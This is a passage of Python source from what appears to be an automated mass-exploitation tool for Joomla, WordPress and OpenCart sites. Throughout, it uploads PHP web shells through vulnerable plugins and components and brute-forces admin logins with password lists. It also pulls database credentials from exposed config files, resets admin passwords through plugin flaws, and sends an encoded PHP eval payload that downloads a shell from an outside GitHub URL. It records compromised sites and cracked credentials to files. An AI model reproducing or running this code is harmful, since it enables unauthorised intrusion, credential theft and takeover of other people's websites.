                print(la5dhar +'[Joomla]'+ url + ' +++++++++++++ [mod_artuploader Shell]'+ '\n')
            else: 
                print(la7mar +'[Joomla]'+cyan+url+cyan+la7mar +'[Not Vuln mod_artuploader]'+la7mar+ '\n')                 
        except:
            print(la7mar +'[Joomla]'+cyan+url+cyan+la7mar +'[Not Vuln mod_artuploader]'+la7mar+ '\n')
            pass

        try:
            izo = self.ran(10) + '.php'   
            PostFile = {'uploadfile':(izo, shell,'text/html')}
            requests.post(url + '/administrator/index.php?option=com_novasfh&c=uploader', files=PostFile, timeout=10, headers=agent)
            CheckShell = requests.get(url + '/'+izo, timeout=10, headers=agent)
            if 'RxR HaCkEr' in str(CheckShell.text):
                with open('Vulns/Shell_Vulnss.txt', 'a') as writer:
                    writer.write(url + '/'+izo + '\n')
                print(la5dhar +'[Joomla]'+ url + ' +++++++++++++ [com_novasfh Shell]'+ '\n')
            else: 
                print(la7mar +'[Joomla]'+cyan+url+cyan+la7mar +'[Not Vuln com_novasfh]'+la7mar+ '\n')                 
        except:
            print(la7mar +'[Joomla]'+cyan+url+cyan+la7mar +'[Not Vuln com_novasfh]'+la7mar+ '\n')
            pass
            
        try:
            izo = self.ran(10) + '.php'   
            PostFile = {'uploadfile':(izo, shell,'text/html')}
            requests.post(url + '/index.php?option=com_collector&view=filelist&tmpl=component&folder=&type=1', files=PostFile, timeout=10, headers=agent)
            CheckShell = requests.get(url + '/'+izo, timeout=10, headers=agent)
            if 'RxR HaCkEr' in str(CheckShell.text):
                with open('Vulns/Shell_Vulnss.txt', 'a') as writer:
                    writer.write(url + '/'+izo + '\n')
                print(la5dhar +'[Joomla]'+ url + ' +++++++++++++ [com_collector Shell]'+ '\n')
            else: 
                print(la7mar +'[Joomla]'+cyan+url+cyan+la7mar +'[Not Vuln com_collector]'+la7mar+ '\n')                 
        except:
            print(la7mar +'[Joomla]'+cyan+url+cyan+la7mar +'[Not Vuln com_collector]'+la7mar+ '\n')
            pass 
        try:
            izo = self.ran(10) + '.php'   
            PostFile = {'uploadfile':(izo, shell,'text/html')}
            requests.post(url + '/index.php?option=com_ksadvertiser&Itemid=36&task=add&catid=0&lang=en', files=PostFile, timeout=10, headers=agent)
            CheckShell = requests.get(url + '/images/ksadvertiser/U0/'+izo, timeout=10, headers=agent)
            if 'RxR HaCkEr' in str(CheckShell.text):
                with open('Vulns/Shell_Vulnss.txt', 'a') as writer:
                    writer.write(url + '/images/ksadvertiser/U0/'+izo + '\n')
                print(la5dhar +'[Joomla]'+ url + ' +++++++++++++ [com_ksadvertiser Shell]'+ '\n')
            else: 
                print(la7mar +'[Joomla]'+cyan+url+cyan+la7mar +'[Not Vuln com_ksadvertiser]'+la7mar+ '\n')                 
        except:
            print(la7mar +'[Joomla]'+cyan+url+cyan+la7mar +'[Not Vuln com_ksadvertiser]'+la7mar+ '\n')
            pass
        try:
            izo = self.ran(10) + '.php'   
            PostFile = {'uploadfile':(izo, shell,'text/html')}
            requests.post(url + '/com_hwdvideoshare/assets/uploads/flash/flash_upload.php?jqUploader=1', files=PostFile, timeout=10, headers=agent)
            CheckShell = requests.get(url + '/tmp/'+izo, timeout=10, headers=agent)
            if 'RxR HaCkEr' in str(CheckShell.text):
                with open('Vulns/Shell_Vulnss.txt', 'a') as writer:
                    writer.write(url + '/tmp/'+izo + '\n')
                print(la5dhar +'[Joomla]'+ url + ' +++++++++++++ [com_hwdvideoshare Shell]'+ '\n')
            else: 
                print(la7mar +'[Joomla]'+cyan+url+cyan+la7mar +'[Not Vuln com_hwdvideoshare]'+la7mar+ '\n')                 
        except:
            print(la7mar +'[Joomla]'+cyan+url+cyan+la7mar +'[Not Vuln com_hwdvideoshare]'+la7mar+ '\n')
            pass
        try:
            izo = self.ran(10) + '.php'   
            PostFile = {'uploadfile':(izo, shell,'text/html')}
            requests.post(url + '/modules/mod_jfancy/script.php', files=PostFile, timeout=10, headers=agent)
            CheckShell = requests.get(url + '/images/'+izo, timeout=10, headers=agent)
            if 'RxR HaCkEr' in str(CheckShell.text):
                with open('Vulns/Shell_Vulnss.txt', 'a') as writer:
                    writer.write(url + '/images/'+izo + '\n')
                print(la5dhar +'[Joomla]'+ url + ' +++++++++++++ [mod_jfancy Shell]'+ '\n')
            else: 
                print(la7mar +'[Joomla]'+cyan+url+cyan+la7mar +'[Not Vuln mod_jfancye]'+la7mar+ '\n')                 
        except:
            print(la7mar +'[Joomla]'+cyan+url+cyan+la7mar +'[Not Vuln mod_jfancy]'+la7mar+ '\n')
            pass                        
        try:

            Agent = {
                'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
            username = str(url)
            if 'http' in url:
                username = username.replace('www.', '')
                username = username.replace('http://', '')
                username = username.replace('https://', '')                    
            else:
                username = url
            if '/' in url:
                username = username.split('/')[0]
            else:
                username = username
            if '.' in username:
                username = username.split('.')[0]           

            admins = [str(username), 'admin', 'demo', str(username)+'123', str(username)+'@123']
            passwords = ['admin', 'demo123', str(username), str(username)+'2017', str(username)+'2018', str(username)+'2019', 'demo', 'secret', 'admin123', '123456', '123456789', '123', '1234', '12345',
                         '1234567', '12345678', '123456789', 'admin1234', 'admin123456', 'pass123', 'root', '321321',
                         '123123', '112233', '102030', 'password', 'pass', 'qwerty', 'abc123', '654321', 'pass1234',
                         'password123', 'Beast3x@8*#4@!']

            jo_lib = requests.session()

            for admin in admins:
                for pwdjox in passwords:
                    pwdjoxz = pwdjox.strip()
                    jo_lib1 = jo_lib.get(url + '/administrator/index.php',timeout=7)

                    token = re.findall('type="hidden" name="(.*?)" value="1"', jo_lib1.text)

                    jo_logs = {'username': admin,
                               'passwd': pwdjoxz,
                               token[0]: '1',
                               'lang': 'en-GB',
                               'option': 'com_login',
                               'task': 'login',
                               'return': 'aW5kZXgucGhw'}

                    req_jo = jo_lib.post(url + '/administrator/index.php', data=jo_logs, headers=Agent,timeout=7)

                    if 'New Article' in req_jo.text:

                        jo_check = jo_lib.get(url + '/administrator/index.php?option=com_plugins',timeout=7)

                        if 'New Article' in jo_check.text:

                            print(la7mar +'[Joomla]'+la5dhar + '[+] Cracked Success Joomla --> ' + url + '|' + admin + '|' + pwdjoxz + labyadh + '\n')
                            open('Vulns/JoomlaCracked.txt', 'a').write(
                                url + '/administrator/index.php ' + '|' + admin + '|' + pwdjoxz + ' [#]Joomla \n')
                                
                            io = jo_lib.get(url+'/administrator/index.php?option=com_templates&view=template&id=503&file=L2pzc3RyaW5ncy5waHA%3D')
                            Tokenedit = re.findall('<input type="hidden" name="(.*?)" value="1" />', io.text)
                            edit_file = {'jform[source]':shell,
                                         'task':'template.apply',
                                         Tokenedit[0]:'1',
                                         'jform[extension_id]':'503',
                                         'jform[filename]':'/jsstrings.php'}
                            io1 = jo_lib.post(url+'/administrator/index.php?option=com_templates&view=template&id=503&file=L2pzc3RyaW5ncy5waHA=', data=edit_file)
                            checker = jo_lib.get(url+'/templates/beez3//jsstrings.php')
                            if 'RxR HaCkEr' in checker.text:
                                print(la7mar +'[Joomla]'+la5dhar + '[+] Shell Uploaded Success Joomla --> ' + url + '/templates/beez3//jsstrings.php' + '\n')
                                open('Vulns/joomlacrackShelled.txt', 'a').write(
                                    url + '/templates/beez3//jsstrings.php' + '\n')                                
                            else: 
                                print(la7mar +'[Joomla]'+cyan+url+cyan+la7mar +'[Failed Joomla]'+la7mar+ '\n')

                        else:
                            #print('[-] Failed Joomla -->' + url + '|' + admin + ';' + pwdjoxz + labyadh + '\n')
                            print(la7mar +'[Joomla]'+cyan+ url + '|' + admin + ';' + pwdjoxz+cyan+la7mar +'[Failed Joomla]'+la7mar+ '\n')

                    else:
                        #print('[-] Failed Joomla -->' + url + '|' + admin + ';' + pwdjoxz + labyadh + '\n')
                        print(la7mar +'[Joomla]'+cyan+ url + '|' + admin + ';' + pwdjoxz+cyan+la7mar +'[Failed Joomla]'+la7mar+ '\n')



        except:
            pass

    def opencart(self,url):
        try:
            cr = open('Vulns/OpencardCracked.txt', 'a')
            passlist = ["123", "1", "admin", "admin1", "123456", "pass", "password", "admin123", "12345", "admin@123", "administrator", "test",
                        "123456789", "1234", "12345678", "123123", "demo", "blah", "hello", "1234567890", "zx321654xz",
                        "1234567", "adminadmin", "welcome", "666666", "access", "1q2w3e4r", "xmagico", "admin1234",
                        "logitech",
                        "p@ssw0rd", "login", "test123", "root", "pass123", "password1", "qwerty", "111111", "gimboroot"]
            for passwordx in passlist:
                passwd = passwordx.strip()
                # print passwd
                cookies = {
                    'OCSESSID': '41793cc49288925a72df1b7b5c',
                    'language': 'en-gb',
                    'currency': 'IDR',
                }

                data = {
                    'username': 'admin',
                    'password': passwd
                }
                r = requests.get(url + "/admin/index.php",timeout=7)
                if "https://" in r.url:
                    url = url.replace("http://", "https://")
                else:
                    pass
                s = requests.Session()
                r = s.post(url + '/admin/index.php', cookies=cookies, data=data,timeout=7)

                if 'common/logout' in r.text:
                    print(lasfar + '-----------------------------------------OpenCart-----------------------------------------' + labyadh + '\n')
                    print(lazra9 + '[+] Cracked Success OpenCart--> ' + url + '|admin|' + passwd + labyadh + '\n')
                    print(lasfar + '------------------------------------------------------------------------------------------' + labyadh + '\n ')
                    cr.write(url + '/admin |admin|' + passwd + ' [#]OpenCart\n')
                    break
                else:
                    print('[-] Failed  OpenCart --> ' + url + '|admin|' + passwd + labyadh + '\n')
            return 0
        except:
            pass

    #add timeout , if you raeding this i just want to say hello , hope you are fine , and go to hell ,

    def HACKiT(self,url, payload, shell_path):
        try:
            cmd1 = "<?php eval('?>'.base64_decode('PD9waHAKZnVuY3Rpb24gYWRtaW5lcigkdXJsLCAkaXNpKSB7CgkkZnAgPSBmb3BlbigkaXNpLCAidyIpOwoJJGNoID0gY3VybF9pbml0KCk7CgljdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfVVJMLCAkdXJsKTsKCWN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9CSU5BUllUUkFOU0ZFUiwgdHJ1ZSk7CgljdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsIHRydWUpOwoJY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1NTTF9WRVJJRllQRUVSLCBmYWxzZSk7CgljdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfRklMRSwgJGZwKTsKCXJldHVybiBjdXJsX2V4ZWMoJGNoKTsKCWN1cmxfY2xvc2UoJGNoKTsKCWZjbG9zZSgkZnApOwoJb2JfZmx1c2goKTsKCWZsdXNoKCk7Cn0KaWYoYWRtaW5lcigiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1hpNHU3L2p1c3QtZm9yLWZ1bi9tYXN0ZXIvd3AucGhwIiwiYXMucGhwIikpIHsKCWVjaG8gIlN1a3NlcyI7Cn0gZWxzZSB7CgllY2hvICJmYWlsIjsKfQo/Pg==')); ?>"
            #cmd1 = "fwrite(fopen('rxr.php','w+'),file_get_contents('https://pastebin.com/raw/KUDbhDy2');"
            see = requests.session()
            Agent4 = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}
            ktn4 = see.get(payload, headers=Agent4, data=cmd1, timeout=15)
            if ktn4:
                try:
                    ktn5 = see.get(shell_path, headers=Agent4, timeout=15)
                    if 'Password' in ktn5.text:
                        print(la5dhar +'[PhpUnit]'+ url + ' +++++++++++++ [Shell PhpUnit]'+ '\n')
                        open('Vulns/Shells.txt', 'a').write(shell_path + '\n')
                    else:
                        print((la7mar +'[PhpUnit]'+cyan+url+cyan+la7mar +'[Not Upload PhpUnit]'+la7mar+ '\n'))

                except:
                    pass

            else:
                print((la7mar +'[PhpUnit]'+cyan+url+cyan+la7mar +'[Not Upload PhpUnit]'+la7mar+ '\n'))
        except:
            print((la7mar +'[PhpUnit]'+cyan+url+cyan+la7mar +'[Not Upload PhpUnit]'+la7mar+ '\n'))
        pass

    def getinw(self, url):

        r = requests.get(url+'/wp-json/wp/v2/users', headers=headers, timeout=10, verify=False)
        if r.ok:
            if 'slug' in r.text:
                username = r.json()[0]['slug']
                self.get_admincookie(url, username)
                try:
                    if username == '':
                        for x in r.json():
                            slug_ = x['slug']
                            if slug_ != '':
                                username = x['slug']
                                self.get_admincookie(url, username)
                except:
                    username = 'admin'
                    self.get_admincookie(url, username)
            else:
                username = 'admin'
                self.get_admincookie(url, username)
        else:
            pass

    def get_admincookie(self,url, username):
        session = requests.session()

        json_info = {'iwp_action': 'add_site','params': {'username': username}}
        try:
            session.post(url, timeout=7, verify=False, headers={'User-Agent': 'raphaelrocks'}, data='_IWP_JSON_PREFIX_{}'.format(base64.b64encode(json.dumps(json_info).encode('utf-8')).decode('utf-8')))
            G = session.get(url + '/wp-admin/', timeout=10, headers=headers)
            if '_logged' in str(session.cookies) and 'dashboard' in str(G.text):
               print(la5dhar +'[WP]'+ url + ' +++++++++++++ [WPinfinite Success]'+ '\n')
               with open('Vulns/infinite_wp_vuln.txt', 'a+') as output:
                  output.write(f'VULN : {url}\n')
            else:
                 print(la7mar +'[WP]'+cyan+url+cyan+la7mar +'[Not Login WPinfinite]'+la7mar+ '\n')

        except:
            print(la7mar +'[WP]'+cyan+url+cyan+la7mar +'[Not Vuln WPinfinite]'+la7mar+ '\n')
            pass


    def send_smtp(self,data):
        try:
            sender = ['sercany9293@gmail.com', 'email2@gmail.com']
            random_sender = random.choice(sender)
            server = smtplib.SMTP('smtp.server.com', 1234)
            server.ehlo()
            server.starttls()
            server.login(random_sender, 'p@ssw0rd')
            server.sendmail(random_sender, 'receiver@email.com', data.as_string())
        except:
            pass
    

    def brute_force_login(self,url, username, cookies):
    
        headers =\
            {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Cookie': f'humans_21909=1; {cookies}'}

        try:
            alix = str(url)
            if 'http' in url:
                alix = alix.replace('www.', '')
                alix = alix.replace('http://', '')
                alix = alix.replace('https://', '')                    
            else:
                alix = url
            if '/' in url:
                alix = alix.split('/')[0]
            else:
                alix = alix
            if '.' in alix:
                alix = alix.split('.')[0]
            passwd = [username, '2018', '2019', '2020', 'Q#prBUe3J53N!gsQ', username+'2018', username+'2019', username+'2020', 'Password', '123456', '123456789', '123', 'test', 'pass', 'z43218765z', 'Qwerty', '1111111', '12345678', 'abc123', '1234567', 'password1', 'admin', 'passw0rd', 'master', 'test123', 'trustno1', 'hello', 'Admin@123', 'admin1234', '1234', str(alix), str(alix)+'123', str(alix)+'@123', str(alix)+'2017', str(alix)+'2018', str(alix)+'2019', str(alix)+'2020', str(alix)+'2021', 'p@ssword', 'P@ssw0rd', '666666', 'administrator1234', 'Administrator123']
            #passwd = ['Password', '123456', '123456789', '123', 'pass', 'z43218765z', 'Qwerty', '1111111', '12345678', 'abc123', '1234567', 'password1', 'admin', 'passw0rd', 'master', 'trustno1', 'hello', 'Admin@123', 'admin1234', '1234', 'p@ssword', 'P@ssw0rd', '666666', 'administrator1234', 'Administrator123']
            for z in passwd:
                pass1 = []
                pass1.append(z)
                pass2 = [f'{username}@{z}']
                passwordlist = pass1+pass2
                for passwords in passwordlist:

                    data = {'log': username,
                    'pwd': passwords,
                    'wp-submit': 'Log+In',
                    'testcookie': '1'}

                    r = requests.post(url+'/wp-login.php', headers=headers, timeout=20, data=data, verify=False, allow_redirects=False)
                    #print(f'Status Code : {r.status_code} URL: {r.url} - Login INFO : {username}::{passwords}')
                    print(f'{la7mar}[WP] : {r.status_code} {cyan}{r.url} - {la7mar}Trying :: {username}::{passwords}')
                    if f'{username}%' in r.headers['Set-Cookie'] and 'wordpress_logged_in' in r.headers['Set-Cookie']:
                        #print(f'[Log in Success] >> {url} - {username}::{passwords}')
                        print(f'{la5dhar}[WP][Log in success] >> {url} - {username}::{passwords}')
                        data1 = f'{la5dhar}[WP][Log in success] >> {url} - {username}::{passwords}'
                        self.wpupload(url,username,passwords)
                        data_str = MIMEText(data1)
                        with open('Vulns/wp_crack_login_page.txt', 'a+') as output:   
                            output.write(f'[Log in Success] >> {r.url} - {username}::{passwords}\n')
                        sys.exit()
                        self.send_smtp(data_str)
                    else:
                        pass
        except:
            pass

    def brute_force_xmlrpc(self,url, username, cookies):

        headers =\
            {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Cookie': f'humans_21909=1; {cookies}'}

        try:
            alix = str(url)
            if 'http' in url:
                alix = alix.replace('www.', '')
                alix = alix.replace('http://', '')
                alix = alix.replace('https://', '')                    
            else:
                alix = url
            if '/' in url:
                alix = alix.split('/')[0]
            else:
                alix = alix
            if '.' in alix:
                alix = alix.split('.')[0]
            passwd = [username, '2018', '2019', '2020', 'Q#prBUe3J53N!gsQ', username+'2018', username+'2019', username+'2020', 'Password', 'test', 'test123', '123456', '123456789', '123', 'pass', 'z43218765z', 'Qwerty', '1111111', '12345678', 'abc123', '1234567', 'password1', 'admin', 'passw0rd', 'master', 'trustno1', 'hello', 'Admin@123', 'admin1234', '1234', str(alix), str(alix)+'123', str(alix)+'@123', str(alix)+'2017', str(alix)+'2018', str(alix)+'2019', str(alix)+'2020', str(alix)+'2021', 'p@ssword', 'P@ssw0rd', '666666', 'administrator1234', 'Administrator123']
            #passwd = ['Password', '123456', '123456789', '123', 'pass', 'z43218765z', 'Qwerty', '1111111', '12345678', 'abc123', '1234567', 'password1', 'admin', 'passw0rd', 'master', 'trustno1', 'hello', 'Admin@123', 'admin1234', '1234', 'p@ssword', 'P@ssw0rd', '666666', 'administrator1234', 'Administrator123']
            for z in passwd:
                pass1 = []
                pass1.append(z)
                pass2 = [f'{username}@{z}']
                passwordlist = pass1+pass2
                for passwords in passwordlist:     

                    data = """<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>%s</value></param><param><value>%s</value></param></params></methodCall>""" % (username, passwords)
                    r = requests.post(url+'/xmlrpc.php', headers=headers, data=data, timeout=20, verify=False)
                    #print(f'Status Code : {r.status_code} URL: {r.url} - Login INFO : {username}::{passwords}')
                    print(f'{la7mar}[WP] : {r.status_code} {cyan}{r.url} - {la7mar}Trying :: {username}::{passwords}')

                    if r.ok:
                        if 'isAdmin' in r.text:
                            #print(f'[Log in success] >> {url} - {username}::{passwords}')
                            print(f'{la5dhar}[WP][Log in success] >> {url} - {username}::{passwords}')
                            data1 = f'{la5dhar}[WP][Log in success] >> {url} - {username}::{passwords}'
                            data_str = MIMEText(data1)
                            self.wpupload(url,username,passwords)
                            with open('Vulns/wp_crackxmlrpc.txt', 'a+') as output:
                                output.write(f'[Log in success] >> {url} - {username}::{passwords}\n')
                            sys.exit()
                    if not r.ok:
                        self.brute_force_login(url, username, cookies)
        except:
            pass

    def check_xmlrpc(self,url, username, cookies):
        try:

            data = """<methodCall> <methodName>demo.sayHello</methodName><params></params></methodCall>"""
            r = requests.post(url+'/xmlrpc.php', data=data, headers=headers, verify=False, timeout=20)
            if r.ok:
                if 'Hello!' in r.text:
                    self.brute_force_xmlrpc(url, username, cookies)
                else:
                    self.brute_force_login(url, username, cookies)
            else:
                self.brute_force_login(url, username, cookies)
        except:
            pass

    def get_user(self,url, cookies):
         
        try:
            r = requests.get(url+'/wp-json/wp/v2/users/', timeout=20, headers=headers, verify=False)
            if r.ok:
               e = r.text
               f = json.loads(e)
               for username in f:
                   #username = f[1]["slug"]
                   self.get_admincookie(url, username['slug'])
                   self.check_xmlrpc(url, username['slug'], cookies)

            elif r.status_code == 401:
                username = 'admin'
                self.get_admincookie(url, username)
                self.check_xmlrpc(url, username, cookies)
            else:
                pass
        except:
            pass

    def wpbrute(self,url):
        try:
            for path in DowloadConfig:
                Exp = url + path
                GetConfig = requests.get(Exp, timeout=20, headers=Headers)
                if 'DB_PASSWORD' in str(GetConfig.text):
                    print(la5dhar +'[WP]'+ url + ' +++++++++++++ [ConfigDown Success]'+ '\n')
                    Gethost = re.findall("'DB_HOST', '(.*)'", str(GetConfig.text))
                    Getuser = re.findall("'DB_USER', '(.*)'", str(GetConfig.text))
                    Getpass = re.findall("'DB_PASSWORD', '(.*)'", str(GetConfig.text))
                    Getdb = re.findall("'DB_NAME', '(.*)'", str(GetConfig.text))
                    with open('Vulns/Config_results.txt', 'a') as ww:
                       ww.write(' Host:  ' + Gethost[0] + '\n' + ' user:  ' + Getuser[0] + '\n' + ' pass:  ' + Getpass[0] + '\n' + ' DB:    ' + Getdb[0] + '\n---------------------\n')
                    #self.pma(url,host,username,password)
                    self.LoginHTTP(Gethost[0], Getuser[0], Getpass[0], Getdb[0])
                    self.pmax(Gethost[0],Getuser[0],Getpass[0],url)              
                else:
                    print(la7mar +'[WP]'+cyan+url+cyan+la7mar +'[ConfigDown Not Vuln]'+la7mar+ '\n')
        except:
            print(la7mar +'[WP]'+cyan+url+cyan+la7mar +'[ConfigDown Not Vuln]'+la7mar+ '\n')

        try:
            my_session = requests.Session()
            exploit = url+'/emergency.php'
            cek_site = my_session.get(exploit).text
            if 'WordPress Emergency' in cek_site:       
                print(la5dhar +'[WP]'+ url + ' +++++++++++++ [WPreset Emergency Vuln]'+ '\n')
                open("Vulns/wpreset.txt", "a").write(url + '/emergency.php'+'\n')
                try:
                    post = {"e-name":"admin","e-pass":"123321ss","update":"Update Options"}
                    gon = my_session.post(exploit,data=post,headers=Headers,timeout=10)
                    if 'successfully' in str(gon.text):
                        print(la5dhar +'[WP]'+ url + ' +++++++++++++ [WPreset Emergency Success]'+ '\n')
                        open("Vulns/wpreset.txt", "a").write(url + '/wp-login.php user:admin pass:123321ss'+'\n')
                        slug="admin"
                        new_pass="123321ss"
                        self.wpupload(url,slug,new_pass)
                    else:
                        print(la7mar +'[WP]'+cyan+url+cyan+la7mar +'[Faied Update Pass]'+la7mar+ '\n')
                except:
                    pass            
            else:
                print(la7mar +'[WP]'+cyan+url+cyan+la7mar +'[WpReset Emergency Not Vuln]'+la7mar+ '\n')
        except Exception as e:
            print(e)

        try:


            login = enum(url)
        
            pw = "ownertn2019"
        
            reset = urllib.urlencode({'new_pass': pw, 'confirm_new_pass': pw, 'user_login': login, 'action': 'cs_reset_pass'})
            data = requests.post(url + "/wp-admin/admin-ajax.php", data=reset, headers=Headers, verify=False)

            res = re.findall(r'<i class=\"(.*?)\"',str(data.text))
            for i in res:
                if i == str('icon-checkmark6') and data.status_code == 200:
                    #print("\033[92m[>] \033[0mExploit Reset Password   \033[92m[Done] ").format(url,login,pw,sb,fg)
                    print(la5dhar +'[WP]'+ url + ' +++++++++++++ [Success Reset Password]'+ '\n')
                    open('Vulns/resetsuccess.txt', 'a').write(url + "|" + login + "|" + pw + "\n")
                else:
                    print(la7mar +'[WP]'+cyan+url+cyan+la7mar +'[Not Vuln Reset Password]'+la7mar+ '\n')
        except:
            pass
        try:
            exploit = '/?up_auto_log=true'
            req = requests.session()
            req.get(url, timeout=15, headers=Headers)
            admin_re_page = url + '/wp-admin/'
            req.get(url + exploit, timeout=15, headers=Headers)
            Check_login = req.get(admin_re_page, timeout=10, headers=Headers)
            if '<li id="wp-admin-bar-logout">' in Check_login.text:
                self.wpupro(req,url)
                print(la5dhar +'[WP]'+ url + exploit + '  [ Userpro Login Success]'+ '\n')
                file = open("Vulns/userpro.txt","a")
                file.write(ass+"\n")
                file.close()
            else:
                print(la7mar +'[WP]'+cyan+url+cyan+la7mar +'[Not Vuln Userpro]'+la7mar+ '\n')                       
        except Exception as e:
            print(str(e))

        try:
            session = requests.Session()
            rawBody = "IWP_JSON_PREFIX"
            headers = {"Referer":url}
            response = session.post(url, data=rawBody, headers=headers, verify=False)
            for cookie in response.cookies:
                if "logged" in cookie.name:
                    cookieadmin = cookie
            response2 = session.get(url+"wp-admin/index.php", headers=headers, cookies = response.cookies, verify=False)
            if "Dashboard" in response2.text:
                self.wpupro(session,url)
                print(la5dhar +'[WP]'+ url + ' +++++++++++++ [WPtimeCapsule Shell]'+ '\n')
                print (cookieadmin.name+":"+cookieadmin.value)
                open("Vulns/timecapsule.txt", "a").write(url+'\n'+cookieadmin.name+":"+cookieadmin.value+'\n')
            else:
                print(la7mar +'[WP]'+cyan+url+cyan+la7mar +'[Not Vuln WPtimeCapsule ]'+la7mar+ '\n')
                

        except:
            print(la7mar +'[WP]'+cyan+url+cyan+la7mar +'[Not Vuln WPtimeCapsule ]'+la7mar+ '\n')
            pass       

        try:
            homeposta = requests.get(url+'/wp-json/wp/v2/posts',headers=Headers,timeout=15)
            tokex = re.findall('\/?p=(.*?)"}',homeposta.text)
            tokew = tokex[0]

            homepage = requests.get(url,headers=Headers,timeout=15)
            token = re.findall('"nonce":"(.*?)"}',homepage.text)
            #homepage = homepage.split("ajax_nonce\":\"",homepage)
            securitykey = token[1][:10]



            headersp = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0",
                            "Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Language": "en-US,en;q=0.5",
                            "Accept-Encoding": "gzip, deflate", "X-Requested-With": "XMLHttpRequest",
                            "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryUGWBOKSwsalnzhha",
                            "Origin":url,"Referer":url
                            }


            datadc = "------WebKitFormBoundaryUGWBOKSwsalnzhha\r\nContent-Disposition: form-data; name=\"supported_type\"\r\n\r\n" \
                "wmuUploadFiles\r\n------WebKitFormBoundaryUGWBOKSwsalnzhha\r\nContent-Disposition: form-data; name=\"wmu_nonce\"\r\n\r\n" \
                +securitykey+"\r\n------WebKitFormBoundaryUGWBOKSwsalnzhha\r\nContent-Disposition: form-data; name=\"wmuAttachmentsData\"\r\n\r\n" \
                "undefined\r\n------WebKitFormBoundaryUGWBOKSwsalnzhha\r\nContent-Disposition: form-data; name=\"wmu_files[0]\"; " \
                "filename=\"hello.php\"\r\nContent-Type: image/jpeg\r\n\r\n" \
                "GIF89a\r\n<?php phpinfo();?>" \
                "\r\n------WebKitFormBoundaryUGWBOKSwsalnzhha--\r\n" \
                "\r\nContent-Disposition: form-data; name=\"postId\"\r\n\r\n" \
                +tokew+"\r\n------WebKitFormBoundaryUGWBOKSwsalnzhha--"
            
            getme = requests.post(url + '/wp-admin/admin-ajax.php',headers=headersp,data=datadc,timeout=15)
            if getme.status_code == 200:
                tok = re.findall('hello-(.*?).php"',getme.text)
                print(tok[0])
                ckme = requests.get(url + '/wp-content/uploads/'+x.strftime("%Y/%m/")+'hello-'+tok[0]+'.php5',headers=headersh,timeout=15)
                if "PHP Version" in ckme.text:
                    print(la5dhar +'[WP]'+ url + ' +++++++++++++ [wpDiscuz Succes Uploaded]'+ '\n')
                    open("Vulns/Shells.txt", "a").write(url + '/wp-content/uploads/'+x.strftime("%Y/%m/")+'hello-'+tok[0]+'.php'+'\n')
                else:
                    print(la7mar +'[WP]'+cyan+url+cyan+la7mar +'[wpDiscuz Failed]'+la7mar+ '\n')
                
            else:
                print(la7mar +'[WP]'+cyan+url+cyan+la7mar +'[wpDiscuz Not Vuln]'+la7mar+ '\n')

        except:
            print(la7mar +'[WP]'+cyan+url+cyan+la7mar +'[wpDiscuz Not Vuln]'+la7mar+ '\n')
            pass

        try:
        
            homepage = requests.get(url,headers=Headers,timeout=25)
            token = re.findall('"nonce":"(.*?)"}',homepage.text)
            securitykey = token[0]
            print("samanye")
            print(securitykey)
            caso = self.ran(10) + '.php',self.ran(10) + '.phtml',self.ran(10) + '.php.TxT',self.ran(10) + '.php4'
            for izo in caso:
                s = requests.Session()
                shell_content = s.get("https://raw.githubusercontent.com/izx2023/z/main/14x.php")
                r = s.post(url+"/wp-admin/admin-ajax.php?action=ap_file_upload_action&file_uploader_nonce="+securitykey+"&allowedExtensions[]=php&sizeLimit=64000",files={"qqfile":(izo,shell_content.text.encode(), "text/php")})
                Check = s.get(url  + '/wp-content/uploads/2021/01/'+izo, headers=Headers)
                Check2 = s.get(url  + '/wp-content/uploads/'+izo, headers=Headers)
                if 'SEA-GHOST' in Check.text:
                    with open('Vulns/Shell_Vulnss.txt', 'a') as writer:
                        writer.write(url  + '/wp-content/uploads/2021/01/'+izo + '\n')
                    print(la5dhar +'[WP]'+ url + ' +++++++++++++ [AccessPress Anonymous Post Pro Shell]'+ '\n')
                elif 'SEA-GHOST' in Check2.text:
                    with open('Vulns/Shell_Vulnss.txt', 'a') as writer:
                        writer.write(url  + '/wp-content/uploads/'+izo + '\n')
                    print(la5dhar +'[WP]'+ url + ' +++++++++++++ [AccessPress Anonymous Post Pro Shell]'+ '\n')

                else:
                    print(la7mar +'[WP]'+cyan+url+cyan+la7mar +'[Not Vuln AccessPress Anonymous Post Pro]'+la7mar+ '\n')
        except:
            print(la7mar +'[WP]'+cyan+url+cyan+la7mar +'[Not Vuln AccessPress Anonymous Post Pro]'+la7mar+ '\n')
            pass

        try:

            izo = self.ran(10) + '.php'
            data = {"allowed_file_types" : "php,jpg,jpeg","upload" : json.dumps({"dir" : "../"})}
            shelle_content = requests.get("https://raw.githubusercontent.com/izx2023/z/main/14.php")
            getme = requests.post(url + '/wp-admin/admin-ajax.php?action=_ning_upload_image',headers=Headers,files={"files[]":(izo,shelle_content.text.encode(), "text/html")},data=data,timeout=15)
